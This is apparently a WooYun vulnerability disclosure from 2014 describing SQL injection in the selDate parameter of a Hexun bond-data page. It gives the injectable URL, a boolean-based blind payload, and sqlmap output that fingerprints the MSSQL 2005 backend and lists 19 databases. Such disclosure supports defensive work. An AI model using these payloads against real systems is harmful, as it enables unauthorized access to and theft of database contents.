wybug_title: 和讯财经分站SQL注入漏洞（涉及大量数据）
wybug_detail: 漏洞详情 披露状态：   									2014-09-17：	细节已通知厂商并且等待厂商处理中									2014-09-17：	厂商已经确认，细节仅向厂商公开									2014-09-27：	细节向核心白帽子及相关领域专家公开									2014-10-07：	细节向普通白帽子公开									2014-10-17：	细节向实习白帽子公开									2014-11-01：	细节向公众公开  简要描述： 好多库，好多表 详细说明：  注入点：http://bond.money.hexun.com/iframe/bond2-1.aspx?bondtype=1&col=8&orderby=asc&selDate=2011-12-30参数：selDate=2011-12-30') and ('1'='1   漏洞证明：  sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: selDate    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: bondtype=1&col=8&orderby=asc&selDate=2011-12-30') AND 6469=6469 AND ('sWlz'='sWlz---[09:45:06] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[09:45:06] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[09:45:06] [INFO] fetching current usercurrent user:    'basedbo'19个库，每个库里面表都不少，目测数据量很大available databases [19]:[*] DB_ANOTHER[*] DB_BASE[*] DB_BASE_HK[*] DB_FUND[*] DB_FYB2011[*] DB_INDEX[*] DB_INFO[*] DB_LEAGUER[*] DB_MACROECO[*] DB_OTHER[*] DB_STOCK[*] DB_TARGET[*] DB_VALUEADD[*] DB_WEB[*] distribution[*] master[*] model[*] msdb[*] tempdb   修复方案：  过滤吧   版权声明：转载请注明来源 greg.wu@乌云
